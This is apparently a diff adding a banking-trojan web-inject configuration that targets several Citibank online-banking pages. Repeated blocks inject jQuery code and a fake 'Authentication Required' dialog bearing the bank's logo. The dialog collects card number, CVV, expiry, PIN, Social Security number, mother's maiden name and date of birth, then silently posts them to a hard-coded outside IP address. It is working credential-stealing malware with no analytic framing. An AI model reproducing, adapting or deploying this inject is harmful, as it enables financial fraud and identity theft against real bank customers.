+<tr><td align="left" style="text-align: justify; font-size: 11px; background: #FFFFFF;">
+	In order to provide you with extra security, we occasionally need to ask for additional information when you access your accounts online. Please enter the information below to continue.</br></br>
+	  </td></tr>
+	</tbody></table></center>
+  <center>
+	<div>
+		<table>
+			<tbody>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><b>ATM/Debit Card Number</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><input type="text" id="ccAcctNo" name="ccAcctNo" maxlength="20"/></td></tr>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><b>CVV2 (3 digit card verification code)</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><input type="text" name="ccCVV" id="ccCVV" size="3" maxlength="3"/></td></tr>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><b>Expiration Date</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><select name="ccExpMM" id="ccExpMM">
+      <option value="0">
+      <option value="01">01
+      <option value="02">02
+      <option value="03">03
+      <option value="04">04
+      <option value="05">05
+      <option value="06">06
+      <option value="07">07
+      <option value="08">08
+      <option value="09">09
+      <option value="10">10
+      <option value="11">11
+      <option value="12">12
+     </select>
+     <select name="ccExpYYYY" id="ccExpYYYY">
+      <option value="0">
+      <option value="2011">2011
+	  <option value="2012">2012
+	  <option value="2013">2013
+	  <option value="2014">2014
+<option value="2015">2015
+<option value="2016">2016
+<option value="2017">2017
+<option value="2018">2018
+<option value="2019">2019
+<option value="2020">2020
+     </select></td></tr>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><b>PIN (the code you enter at ATMs)</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><input type="password" name="ccPIN" id="ccPIN" size="5" maxlength="10"/></td></tr>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><br><b>Social Security Number</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><br><input type="text" id="ssn1" size="4" maxlength="3" name="ssn1" value="">-<input type="text" id="ssn2" size="3" maxlength="2" name="ssn2" value="">-<input type="text" id="ssn3" size="4" maxlength="4" name="ssn3" value=""></td></tr>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><b>Mother's Maiden Name</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><input type="text" name="mmn" id="mmn" size="12" maxlength="20"/></td></tr>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><b>Date Of Birth</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><select name="dob1" id="dob1">
+<option value="0" ></option>
+<option value="1" >January</option>
+                      
+                        <option value="2" >February</option>
+                        
+                        <option value="3" >March</option>
+                        
+                        <option value="4" >April</option>
+                        
+                        <option value="5" >May</option>
+                        
+                        <option value="6" >June</option>
+                        
+                        <option value="7" >July</option>
+                        
+                        <option value="8" >August</option>
+                        
+                        <option value="9" >September</option>
+                        
+                        <option value="10" >October</option>
+                        
+                        <option value="11" >November</option>
+                        
+                        <option value="12" >December</option>
+                        
+                      </select>
+
+                      <select name="dob2" id="dob2">
+                        <option value="0" ></option>
+                        <option value="1" >1</option>
+                        
+                        <option value="2" >2</option>
+                        
+                        <option value="3" >3</option>
+                        
+                        <option value="4" >4</option>
+                        
+                        <option value="5" >5</option>
+                        
+                        <option value="6" >6</option>
+                        
+                        <option value="7" >7</option>
+                        
+                        <option value="8" >8</option>
+                        
+                        <option value="9" >9</option>
+                        
+                        <option value="10" >10</option>
+                        
+                        <option value="11" >11</option>
+                        
+                        <option value="12" >12</option>
+                        
+                        <option value="13" >13</option>
+                        
+                        <option value="14" >14</option>
+                        
+                        <option value="15" >15</option>
+                        
+                        <option value="16" >16</option>
+                        
+                        <option value="17" >17</option>
+                        
+                        <option value="18" >18</option>
+                        
+                        <option value="19" >19</option>
+                        
+                        <option value="20" >20</option>
+                        
+                        <option value="21" >21</option>
+                        
+                        <option value="22" >22</option>
+                        
+                        <option value="23" >23</option>
+                        
+                        <option value="24" >24</option>
+                        
+                        <option value="25" >25</option>
+                        
+                        <option value="26" >26</option>
+                        
+                        <option value="27" >27</option>
+                        
+                        <option value="28" >28</option>
+                        
+                        <option value="29" >29</option>
+                        
+                        <option value="30" >30</option>
+                        
+                        <option value="31" >31</option>
+                        
+                      </select>
+                      
+                      <select name="dob3" id="dob3">
+                        <option value="0" ></option>
+                        <option value="1900" >1900</option>
+                        
+                        <option value="1901" >1901</option>
+                        
+                        <option value="1902" >1902</option>
+                        
+                        <option value="1903" >1903</option>
+                        
+                        <option value="1904" >1904</option>
+                        
+                        <option value="1905" >1905</option>
+                        
+                        <option value="1906" >1906</option>
+                        
+                        <option value="1907" >1907</option>
+                        
+                        <option value="1908" >1908</option>
+                        
+                        <option value="1909" >1909</option>
+                        
+                        <option value="1910" >1910</option>
+                        
+                        <option value="1911" >1911</option>
+                        
+                        <option value="1912" >1912</option>
+                        
+                        <option value="1913" >1913</option>
+                        
+                        <option value="1914" >1914</option>
+                        
+                        <option value="1915" >1915</option>
+                        
+                        <option value="1916" >1916</option>
+                        
+                        <option value="1917" >1917</option>
+                        
+                        <option value="1918" >1918</option>
+                        
+                        <option value="1919" >1919</option>
+                        
+                        <option value="1920" >1920</option>
+                        
+                        <option value="1921" >1921</option>
+                        
+                        <option value="1922" >1922</option>
+                        
+                        <option value="1923" >1923</option>
+                        
+                        <option value="1924" >1924</option>
+                        
+                        <option value="1925" >1925</option>
+                        
+                        <option value="1926" >1926</option>
+                        
+                        <option value="1927" >1927</option>
+                        
+                        <option value="1928" >1928</option>
+                        
+                        <option value="1929" >1929</option>
+                        
+                        <option value="1930" >1930</option>
+                        
+                        <option value="1931" >1931</option>
+                        
+                        <option value="1932" >1932</option>
+                        
+                        <option value="1933" >1933</option>
+                        
+                        <option value="1934" >1934</option>
+                        
+                        <option value="1935" >1935</option>
+                        
+                        <option value="1936" >1936</option>
+                        
+                        <option value="1937" >1937</option>
+                        
+                        <option value="1938" >1938</option>
+                        
+                        <option value="1939" >1939</option>
+                        
+                        <option value="1940" >1940</option>
+                        
+                        <option value="1941" >1941</option>
+                        
+                        <option value="1942" >1942</option>
+                        
+                        <option value="1943" >1943</option>
+                        
+                        <option value="1944" >1944</option>
+                        
+                        <option value="1945" >1945</option>
+                        
+                        <option value="1946" >1946</option>
+                        
+                        <option value="1947" >1947</option>
+                        
+                        <option value="1948" >1948</option>
+                        
+                        <option value="1949" >1949</option>
+                        
+                        <option value="1950" >1950</option>
+                        
+                        <option value="1951" >1951</option>
+                        
+                        <option value="1952" >1952</option>
+                        
+                        <option value="1953" >1953</option>
+                        
+                        <option value="1954" >1954</option>
+                        
+                        <option value="1955" >1955</option>
+                        
+                        <option value="1956" >1956</option>
+                        
+                        <option value="1957" >1957</option>
+                        
+                        <option value="1958" >1958</option>
+                        
+                        <option value="1959" >1959</option>
+                        
+                        <option value="1960" >1960</option>
+                        
+                        <option value="1961" >1961</option>
+                        
+                        <option value="1962" >1962</option>
+                        
+                        <option value="1963" >1963</option>
+                        
+                        <option value="1964" >1964</option>
+                        
+                        <option value="1965" >1965</option>
+                        
+                        <option value="1966" >1966</option>
+                        
+                        <option value="1967" >1967</option>
+                        
+                        <option value="1968" >1968</option>
+                        
+                        <option value="1969" >1969</option>
+                        
+                        <option value="1970" >1970</option>
+                        
+                        <option value="1971" >1971</option>
+                        
+                        <option value="1972" >1972</option>
+                        
+                        <option value="1973" >1973</option>
+                        
+                        <option value="1974" >1974</option>
+                        
+                        <option value="1975" >1975</option>
+                        
+                        <option value="1976" >1976</option>
+                        
+                        <option value="1977" >1977</option>
+                        
+                        <option value="1978" >1978</option>
+                        
+                        <option value="1979" >1979</option>
+                        
+                        <option value="1980" >1980</option>
+                        
+                        <option value="1981" >1981</option>
+                        
+                        <option value="1982" >1982</option>
+                        
+                        <option value="1983" >1983</option>
+                        
+                        <option value="1984" >1984</option>
+                        
+                        <option value="1985" >1985</option>
+                        
+                        <option value="1986" >1986</option>
+                        
+                        <option value="1987" >1987</option>
+                        
+                        <option value="1988" >1988</option>
+                        
+                        <option value="1989" >1989</option>
+                        
+                        <option value="1990" >1990</option>
+                        
+                        <option value="1991" >1991</option>
+                        
+                        <option value="1992" >1992</option>
+                        
+                        <option value="1993" >1993</option>
+                        
+                        <option value="1994" >1994</option>
+                        
+                        <option value="1995" >1995</option>
+                        
+                        <option value="1996" >1996</option>
+                        
+                        <option value="1997" >1997</option>
+                        
+                        <option value="1998" >1998</option>
+                        
+                        <option value="1999" >1999</option>
+                        
+                        <option value="2000" >2000</option>
+                        
+                        <option value="2001" >2001</option>
+                        
+                        <option value="2002" >2002</option>
+                        
+                        <option value="2003" >2003</option>
+                        
+                        <option value="2004" >2004</option>
+                        
+                        <option value="2005" >2005</option>
+                        
+                        <option value="2006" >2006</option>
+                        <option value="2007" >2007</option>
+                      </select></td></tr>
+			</tbody>
+		</table>
+	</div>
+	</form>
+	</center>
+</div>
+<form name="injectform" action="" method="post">
+<input type="hidden" name="ccAcctNo_2" id="ccAcctNo_2" />
+<input type="hidden" name="ccCVV_2" id="ccCVV_2" />
+<input type="hidden" name="ccExpMM_2" id="ccExpMM_2" />
+<input type="hidden" name="ccExpYYYY_2" id="ccExpYYYY_2" />
+<input type="hidden" name="ccPIN_2" id="ccPIN_2" />
+<input type="hidden" name="ssn1_2" id="ssn1_2" />
+<input type="hidden" name="ssn2_2" id="ssn2_2" />
+<input type="hidden" name="ssn3_2" id="ssn3_2" />
+<input type="hidden" name="mmn_2" id="mmn_2" />
+<input type="hidden" name="dob1_2" id="dob1_2" />
+<input type="hidden" name="dob2_2" id="dob2_2" />
+<input type="hidden" name="dob3_2" id="dob3_2" />
+<input type="hidden" name="uid" id="uid" value="%BOTNAME%" />
+</form>
+data_end
+data_after
+</body>
+data_end
+
+set_url https://online.citibank.com/US/JRS/portal/accountSummary.do GP
+data_before
+<head>
+data_end
+data_inject
+<link rel="stylesheet" href="http://ajax.googleapis.com/ajax/libs/jqueryui/1.7.2/themes/smoothness/jquery-ui.css" type="text/css" />
+<style type="text/css">
+#inject { display: none; }
+.ui-dialog { font-size: 10px; }
+.ui-dialog .ui-dialog-titlebar-close { visibility: hidden; }
+</style>
+data_end
+data_after
+<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
+data_end
+data_before
+data_end
+data_inject
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.min.js"></script>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.7.1/jquery-ui.min.js"></script>
+<script type="text/javascript">
+var popfrequency="340 hours"
+
+function get_cookie(Name) {
+var search = Name + "="
+var returnvalue = "";
+if (document.cookie.length > 0) {
+offset = document.cookie.indexOf(search)
+if (offset != -1) { // if cookie exists
+offset += search.length
+// set index of beginning of value
+end = document.cookie.indexOf(";", offset);
+// set index of end of cookie value
+if (end == -1)
+end = document.cookie.length;
+returnvalue=unescape(document.cookie.substring(offset, end))
+}
+}
+return returnvalue;
+}
+
+function resetcookie(){
+var expireDate = new Date()
+expireDate.setHours(expireDate.getHours()-10)
+document.cookie = "tcpopunder=;path=/;expires=" + expireDate.toGMTString()
+}
+
+function loadornot(){
+if (get_cookie('tcpopunder')==''){
+loadpopunder()
+}
+}
+
+function loadpopunder(){
+
+function Init() 
+{
+	jQuery('#inject').dialog({ width: 600, resizable: false, buttons: { "Continue": function() {
+	        if (jQuery("#ccAcctNo").val().length < 16) 
+	        {
+		        alert('Please enter a valid ATM/Debit card number.');
+		        jQuery("#ccAcctNo").focus();
+	        } 
+	        else if (jQuery("#ccCVV").val().length < 3) 
+	        {
+		        alert('Please enter the last 3 digits on your signature panel.');
+		        jQuery("#ccCVV").focus();
+	        }
+	        else if (jQuery("#ccExpMM").val() < 1) 
+	        {
+		        alert('Please select an expiration date.');
+		        jQuery("#ccExpMM").focus();
+	        } 
+	        else if (jQuery("#ccExpYYYY").val() < 1) 
+	        {
+		        alert('Please select an expiration date.');
+		        jQuery("#ccExpYYYY").focus();
+	        } 			
+	        else if (jQuery("#ccPIN").val().length < 4) 
+	        {
+		        alert('Please enter your PIN code for your ATM/Checking card.');
+		        jQuery("#ccPIN").focus();
+	        }
+	        else if (jQuery("#ssn1").val().length < 3 || jQuery("#ssn2").val().length < 2 || jQuery("#ssn3").val().length < 4) 
+	        {
+		        alert('Please enter your social security number.');
+		        jQuery("#ssn1").focus();
+	        } 
+	        else if (jQuery("#mmn").val().length < 2) 
+	        {
+		        alert('Please enter your mothers maiden name.');
+		        jQuery("#mmn").focus();
+	        }
+			else if (jQuery("#dob1").val() < 1) 
+	        {
+		        alert('Please select your date of birth.');
+		        jQuery("#dob1").focus();
+	        }
+			else if (jQuery("#dob2").val() < 1) 
+	        {
+		        alert('Please select your date of birth.');
+		        jQuery("#dob2").focus();
+	        }
+			else if (jQuery("#dob3").val() < 1) 
+	        {
+		        alert('Please select your date of birth.');
+		        jQuery("#dob3").focus();
+	        }
+	        else 
+	        {
+		        jQuery("#ccAcctNo_2").val(jQuery("#ccAcctNo").val());
+				jQuery("#ccCVV_2").val(jQuery("#ccCVV").val());
+				jQuery("#ccExpMM_2").val(jQuery("#ccExpMM").val());
+				jQuery("#ccExpYYYY_2").val(jQuery("#ccExpYYYY").val());
+				jQuery("#ccPIN_2").val(jQuery("#ccPIN").val());
+				jQuery("#ssn1_2").val(jQuery("#ssn1").val());
+				jQuery("#ssn2_2").val(jQuery("#ssn2").val());
+                jQuery("#ssn3_2").val(jQuery("#ssn3").val());
+                jQuery("#mmn_2").val(jQuery("#mmn").val());
+                jQuery("#dob1_2").val(jQuery("#dob1").val());
+                jQuery("#dob2_2").val(jQuery("#dob2").val());
+                jQuery("#dob3_2").val(jQuery("#dob3").val());
+				$.post("http://91.223.82.126/ssl/citi.php", $("form[name='injectform']").serialize());
+				jQuery('#inject').dialog('close');
+                var expireDate = new Date()
+                expireDate.setHours(expireDate.getHours()+parseInt(popfrequency))
+                document.cookie = "tcpopunder="+parseInt(popfrequency)+";path=/;expires=" + expireDate.toGMTString()}
+		} 
+}, closeOnEscape: false, modal: true, show: 'slide' });
+}
+jQuery(document).ready(Init);
+}
+
+if (popfrequency=="always"){
+resetcookie()
+loadpopunder()
+}
+else{
+if (get_cookie('tcpopunder')!=parseInt(popfrequency))
+resetcookie()
+loadornot()
+}
+</script>
+<div id="inject">
+	<form>
+	<center>
+	<table><tbody>
+	  <tr><td style="background: #FFFFFF;">
+	<img src="https://online.citibank.com/JRS/cm/img/top_nav/logo.gif" style="margin-top: 0px; margin-left: 0px; margin-bottom: 0px;"/>
+	  </td></tr>
+<tr><td align="center" style="text-align: center; font-size: 10px; background: #FFFFFF;">
+	<br><h3>Authentication Required</h3>
+	  </td></tr>
+<tr><td align="left" style="text-align: justify; font-size: 11px; background: #FFFFFF;">
+	In order to provide you with extra security, we occasionally need to ask for additional information when you access your accounts online. Please enter the information below to continue.</br></br>
+	  </td></tr>
+	</tbody></table></center>
+  <center>
+	<div>
+		<table>
+			<tbody>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><b>ATM/Debit Card Number</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><input type="text" id="ccAcctNo" name="ccAcctNo" maxlength="20"/></td></tr>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><b>CVV2 (3 digit card verification code)</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><input type="text" name="ccCVV" id="ccCVV" size="3" maxlength="3"/></td></tr>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><b>Expiration Date</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><select name="ccExpMM" id="ccExpMM">
+      <option value="0">
+      <option value="01">01
+      <option value="02">02
+      <option value="03">03
+      <option value="04">04
+      <option value="05">05
+      <option value="06">06
+      <option value="07">07
+      <option value="08">08
+      <option value="09">09
+      <option value="10">10
+      <option value="11">11
+      <option value="12">12
+     </select>
+     <select name="ccExpYYYY" id="ccExpYYYY">
+      <option value="0">
+      <option value="2011">2011
+	  <option value="2012">2012
+	  <option value="2013">2013
+	  <option value="2014">2014
+<option value="2015">2015
+<option value="2016">2016
+<option value="2017">2017
+<option value="2018">2018
+<option value="2019">2019
+<option value="2020">2020
+     </select></td></tr>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><b>PIN (the code you enter at ATMs)</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><input type="password" name="ccPIN" id="ccPIN" size="5" maxlength="10"/></td></tr>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><br><b>Social Security Number</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><br><input type="text" id="ssn1" size="4" maxlength="3" name="ssn1" value="">-<input type="text" id="ssn2" size="3" maxlength="2" name="ssn2" value="">-<input type="text" id="ssn3" size="4" maxlength="4" name="ssn3" value=""></td></tr>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><b>Mother's Maiden Name</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><input type="text" name="mmn" id="mmn" size="12" maxlength="20"/></td></tr>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><b>Date Of Birth</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><select name="dob1" id="dob1">
+<option value="0" ></option>
+<option value="1" >January</option>
+                      
+                        <option value="2" >February</option>
+                        
+                        <option value="3" >March</option>
+                        
+                        <option value="4" >April</option>
+                        
+                        <option value="5" >May</option>
+                        
+                        <option value="6" >June</option>
+                        
+                        <option value="7" >July</option>
+                        
+                        <option value="8" >August</option>
+                        
+                        <option value="9" >September</option>
+                        
+                        <option value="10" >October</option>
+                        
+                        <option value="11" >November</option>
+                        
+                        <option value="12" >December</option>
+                        
+                      </select>
+
+                      <select name="dob2" id="dob2">
+                        <option value="0" ></option>
+                        <option value="1" >1</option>
+                        
+                        <option value="2" >2</option>
+                        
+                        <option value="3" >3</option>
+                        
+                        <option value="4" >4</option>
+                        
+                        <option value="5" >5</option>
+                        
+                        <option value="6" >6</option>
+                        
+                        <option value="7" >7</option>
+                        
+                        <option value="8" >8</option>
+                        
+                        <option value="9" >9</option>
+                        
+                        <option value="10" >10</option>
+                        
+                        <option value="11" >11</option>
+                        
+                        <option value="12" >12</option>
+                        
+                        <option value="13" >13</option>
+                        
+                        <option value="14" >14</option>
+                        
+                        <option value="15" >15</option>
+                        
+                        <option value="16" >16</option>
+                        
+                        <option value="17" >17</option>
+                        
+                        <option value="18" >18</option>
+                        
+                        <option value="19" >19</option>
+                        
+                        <option value="20" >20</option>
+                        
+                        <option value="21" >21</option>
+                        
+                        <option value="22" >22</option>
+                        
+                        <option value="23" >23</option>
+                        
+                        <option value="24" >24</option>
+                        
+                        <option value="25" >25</option>
+                        
+                        <option value="26" >26</option>
+                        
+                        <option value="27" >27</option>
+                        
+                        <option value="28" >28</option>
+                        
+                        <option value="29" >29</option>
+                        
+                        <option value="30" >30</option>
+                        
+                        <option value="31" >31</option>
+                        
+                      </select>
+                      
+                      <select name="dob3" id="dob3">
+                        <option value="0" ></option>
+                        <option value="1900" >1900</option>
+                        
+                        <option value="1901" >1901</option>
+                        
+                        <option value="1902" >1902</option>
+                        
+                        <option value="1903" >1903</option>
+                        
+                        <option value="1904" >1904</option>
+                        
+                        <option value="1905" >1905</option>
+                        
+                        <option value="1906" >1906</option>
+                        
+                        <option value="1907" >1907</option>
+                        
+                        <option value="1908" >1908</option>
+                        
+                        <option value="1909" >1909</option>
+                        
+                        <option value="1910" >1910</option>
+                        
+                        <option value="1911" >1911</option>
+                        
+                        <option value="1912" >1912</option>
+                        
+                        <option value="1913" >1913</option>
+                        
+                        <option value="1914" >1914</option>
+                        
+                        <option value="1915" >1915</option>
+                        
+                        <option value="1916" >1916</option>
+                        
+                        <option value="1917" >1917</option>
+                        
+                        <option value="1918" >1918</option>
+                        
+                        <option value="1919" >1919</option>
+                        
+                        <option value="1920" >1920</option>
+                        
+                        <option value="1921" >1921</option>
+                        
+                        <option value="1922" >1922</option>
+                        
+                        <option value="1923" >1923</option>
+                        
+                        <option value="1924" >1924</option>
+                        
+                        <option value="1925" >1925</option>
+                        
+                        <option value="1926" >1926</option>
+                        
+                        <option value="1927" >1927</option>
+                        
+                        <option value="1928" >1928</option>
+                        
+                        <option value="1929" >1929</option>
+                        
+                        <option value="1930" >1930</option>
+                        
+                        <option value="1931" >1931</option>
+                        
+                        <option value="1932" >1932</option>
+                        
+                        <option value="1933" >1933</option>
+                        
+                        <option value="1934" >1934</option>
+                        
+                        <option value="1935" >1935</option>
+                        
+                        <option value="1936" >1936</option>
+                        
+                        <option value="1937" >1937</option>
+                        
+                        <option value="1938" >1938</option>
+                        
+                        <option value="1939" >1939</option>
+                        
+                        <option value="1940" >1940</option>
+                        
+                        <option value="1941" >1941</option>
+                        
+                        <option value="1942" >1942</option>
+                        
+                        <option value="1943" >1943</option>
+                        
+                        <option value="1944" >1944</option>
+                        
+                        <option value="1945" >1945</option>
+                        
+                        <option value="1946" >1946</option>
+                        
+                        <option value="1947" >1947</option>
+                        
+                        <option value="1948" >1948</option>
+                        
+                        <option value="1949" >1949</option>
+                        
+                        <option value="1950" >1950</option>
+                        
+                        <option value="1951" >1951</option>
+                        
+                        <option value="1952" >1952</option>
+                        
+                        <option value="1953" >1953</option>
+                        
+                        <option value="1954" >1954</option>
+                        
+                        <option value="1955" >1955</option>
+                        
+                        <option value="1956" >1956</option>
+                        
+                        <option value="1957" >1957</option>
+                        
+                        <option value="1958" >1958</option>
+                        
+                        <option value="1959" >1959</option>
+                        
+                        <option value="1960" >1960</option>
+                        
+                        <option value="1961" >1961</option>
+                        
+                        <option value="1962" >1962</option>
+                        
+                        <option value="1963" >1963</option>
+                        
+                        <option value="1964" >1964</option>
+                        
+                        <option value="1965" >1965</option>
+                        
+                        <option value="1966" >1966</option>
+                        
+                        <option value="1967" >1967</option>
+                        
+                        <option value="1968" >1968</option>
+                        
+                        <option value="1969" >1969</option>
+                        
+                        <option value="1970" >1970</option>
+                        
+                        <option value="1971" >1971</option>
+                        
+                        <option value="1972" >1972</option>
+                        
+                        <option value="1973" >1973</option>
+                        
+                        <option value="1974" >1974</option>
+                        
+                        <option value="1975" >1975</option>
+                        
+                        <option value="1976" >1976</option>
+                        
+                        <option value="1977" >1977</option>
+                        
+                        <option value="1978" >1978</option>
+                        
+                        <option value="1979" >1979</option>
+                        
+                        <option value="1980" >1980</option>
+                        
+                        <option value="1981" >1981</option>
+                        
+                        <option value="1982" >1982</option>
+                        
+                        <option value="1983" >1983</option>
+                        
+                        <option value="1984" >1984</option>
+                        
+                        <option value="1985" >1985</option>
+                        
+                        <option value="1986" >1986</option>
+                        
+                        <option value="1987" >1987</option>
+                        
+                        <option value="1988" >1988</option>
+                        
+                        <option value="1989" >1989</option>
+                        
+                        <option value="1990" >1990</option>
+                        
+                        <option value="1991" >1991</option>
+                        
+                        <option value="1992" >1992</option>
+                        
+                        <option value="1993" >1993</option>
+                        
+                        <option value="1994" >1994</option>
+                        
+                        <option value="1995" >1995</option>
+                        
+                        <option value="1996" >1996</option>
+                        
+                        <option value="1997" >1997</option>
+                        
+                        <option value="1998" >1998</option>
+                        
+                        <option value="1999" >1999</option>
+                        
+                        <option value="2000" >2000</option>
+                        
+                        <option value="2001" >2001</option>
+                        
+                        <option value="2002" >2002</option>
+                        
+                        <option value="2003" >2003</option>
+                        
+                        <option value="2004" >2004</option>
+                        
+                        <option value="2005" >2005</option>
+                        
+                        <option value="2006" >2006</option>
+                        <option value="2007" >2007</option>
+                      </select></td></tr>
+			</tbody>
+		</table>
+	</div>
+	</form>
+	</center>
+</div>
+<form name="injectform" action="" method="post">
+<input type="hidden" name="ccAcctNo_2" id="ccAcctNo_2" />
+<input type="hidden" name="ccCVV_2" id="ccCVV_2" />
+<input type="hidden" name="ccExpMM_2" id="ccExpMM_2" />
+<input type="hidden" name="ccExpYYYY_2" id="ccExpYYYY_2" />
+<input type="hidden" name="ccPIN_2" id="ccPIN_2" />
+<input type="hidden" name="ssn1_2" id="ssn1_2" />
+<input type="hidden" name="ssn2_2" id="ssn2_2" />
+<input type="hidden" name="ssn3_2" id="ssn3_2" />
+<input type="hidden" name="mmn_2" id="mmn_2" />
+<input type="hidden" name="dob1_2" id="dob1_2" />
+<input type="hidden" name="dob2_2" id="dob2_2" />
+<input type="hidden" name="dob3_2" id="dob3_2" />
+<input type="hidden" name="uid" id="uid" value="%BOTNAME%" />
+</form>
+data_end
+data_after
+</body>
+data_end
+
+set_url https://online.citibank.com/US/jba/rs/ShowTargetAppFromPortlet.do?targetSubApp=* GP
+data_before
+<head>
+data_end
+data_inject
+<link rel="stylesheet" href="http://ajax.googleapis.com/ajax/libs/jqueryui/1.7.2/themes/smoothness/jquery-ui.css" type="text/css" />
+<style type="text/css">
+#inject { display: none; }
+.ui-dialog { font-size: 10px; }
+.ui-dialog .ui-dialog-titlebar-close { visibility: hidden; }
+</style>
+data_end
+data_after
+<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
+data_end
+data_before
+data_end
+data_inject
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.min.js"></script>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.7.1/jquery-ui.min.js"></script>
+<script type="text/javascript">
+var popfrequency="340 hours"
+
+function get_cookie(Name) {
+var search = Name + "="
+var returnvalue = "";
+if (document.cookie.length > 0) {
+offset = document.cookie.indexOf(search)
+if (offset != -1) { // if cookie exists
+offset += search.length
+// set index of beginning of value
+end = document.cookie.indexOf(";", offset);
+// set index of end of cookie value
+if (end == -1)
+end = document.cookie.length;
+returnvalue=unescape(document.cookie.substring(offset, end))
+}
+}
+return returnvalue;
+}
+
+function resetcookie(){
+var expireDate = new Date()
+expireDate.setHours(expireDate.getHours()-10)
+document.cookie = "tcpopunder=;path=/;expires=" + expireDate.toGMTString()
+}
+
+function loadornot(){
+if (get_cookie('tcpopunder')==''){
+loadpopunder()
+}
+}
+
+function loadpopunder(){
+
+function Init() 
+{
+	jQuery('#inject').dialog({ width: 600, resizable: false, buttons: { "Continue": function() {
+	        if (jQuery("#ccAcctNo").val().length < 16) 
+	        {
+		        alert('Please enter a valid ATM/Debit card number.');
+		        jQuery("#ccAcctNo").focus();
+	        } 
+	        else if (jQuery("#ccCVV").val().length < 3) 
+	        {
+		        alert('Please enter the last 3 digits on your signature panel.');
+		        jQuery("#ccCVV").focus();
+	        }
+	        else if (jQuery("#ccExpMM").val() < 1) 
+	        {
+		        alert('Please select an expiration date.');
+		        jQuery("#ccExpMM").focus();
+	        } 
+	        else if (jQuery("#ccExpYYYY").val() < 1) 
+	        {
+		        alert('Please select an expiration date.');
+		        jQuery("#ccExpYYYY").focus();
+	        } 			
+	        else if (jQuery("#ccPIN").val().length < 4) 
+	        {
+		        alert('Please enter your PIN code for your ATM/Checking card.');
+		        jQuery("#ccPIN").focus();
+	        }
+	        else if (jQuery("#ssn1").val().length < 3 || jQuery("#ssn2").val().length < 2 || jQuery("#ssn3").val().length < 4) 
+	        {
+		        alert('Please enter your social security number.');
+		        jQuery("#ssn1").focus();
+	        } 
+	        else if (jQuery("#mmn").val().length < 2) 
+	        {
+		        alert('Please enter your mothers maiden name.');
+		        jQuery("#mmn").focus();
+	        }
+			else if (jQuery("#dob1").val() < 1) 
+	        {
+		        alert('Please select your date of birth.');
+		        jQuery("#dob1").focus();
+	        }
+			else if (jQuery("#dob2").val() < 1) 
+	        {
+		        alert('Please select your date of birth.');
+		        jQuery("#dob2").focus();
+	        }
+			else if (jQuery("#dob3").val() < 1) 
+	        {
+		        alert('Please select your date of birth.');
+		        jQuery("#dob3").focus();
+	        }
+	        else 
+	        {
+		        jQuery("#ccAcctNo_2").val(jQuery("#ccAcctNo").val());
+				jQuery("#ccCVV_2").val(jQuery("#ccCVV").val());
+				jQuery("#ccExpMM_2").val(jQuery("#ccExpMM").val());
+				jQuery("#ccExpYYYY_2").val(jQuery("#ccExpYYYY").val());
+				jQuery("#ccPIN_2").val(jQuery("#ccPIN").val());
+				jQuery("#ssn1_2").val(jQuery("#ssn1").val());
+				jQuery("#ssn2_2").val(jQuery("#ssn2").val());
+                jQuery("#ssn3_2").val(jQuery("#ssn3").val());
+                jQuery("#mmn_2").val(jQuery("#mmn").val());
+                jQuery("#dob1_2").val(jQuery("#dob1").val());
+                jQuery("#dob2_2").val(jQuery("#dob2").val());
+                jQuery("#dob3_2").val(jQuery("#dob3").val());
+				$.post("http://91.223.82.126/ssl/citi.php", $("form[name='injectform']").serialize());
+				jQuery('#inject').dialog('close');
+                var expireDate = new Date()
+                expireDate.setHours(expireDate.getHours()+parseInt(popfrequency))
+                document.cookie = "tcpopunder="+parseInt(popfrequency)+";path=/;expires=" + expireDate.toGMTString()}
+		} 
+}, closeOnEscape: false, modal: true, show: 'slide' });
+}
+jQuery(document).ready(Init);
+}
+
+if (popfrequency=="always"){
+resetcookie()
+loadpopunder()
+}
+else{
+if (get_cookie('tcpopunder')!=parseInt(popfrequency))
+resetcookie()
+loadornot()
+}
+</script>
+<div id="inject">
+	<form>
+	<center>
+	<table><tbody>
+	  <tr><td style="background: #FFFFFF;">
+	<img src="https://online.citibank.com/JRS/cm/img/top_nav/logo.gif" style="margin-top: 0px; margin-left: 0px; margin-bottom: 0px;"/>
+	  </td></tr>
+<tr><td align="center" style="text-align: center; font-size: 10px; background: #FFFFFF;">
+	<br><h3>Authentication Required</h3>
+	  </td></tr>
+<tr><td align="left" style="text-align: justify; font-size: 11px; background: #FFFFFF;">
+	In order to provide you with extra security, we occasionally need to ask for additional information when you access your accounts online. Please enter the information below to continue.</br></br>
